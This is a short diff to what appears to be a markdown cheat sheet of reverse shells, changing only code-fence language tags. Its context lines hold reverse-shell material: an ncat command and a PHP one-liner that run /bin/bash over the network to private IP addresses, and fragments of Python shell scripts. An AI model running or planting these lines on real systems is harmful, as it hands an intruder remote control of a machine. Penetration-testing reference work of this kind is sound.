@@ -92,7 +92,7 @@ ncat -e /bin/bash 192.168.10.58 8080
 
 python3(file)
 
-```
+```Python
 #!/usr/bin/python3
 from os import dup2
 from subprocess import run
@@ -107,7 +107,7 @@ run(["/bin/bash","-i"])
 
 python(file)
 
-```
+```Python
 #!/usr/bin/env python
 import os
 import sys
@@ -120,7 +120,7 @@ sys.exit(0)
 
 php(file)
 
-```
+```Php
 <?php system(\"nc -e /bin/bash 192.168.1.100 80\"); ?>
 ```
 
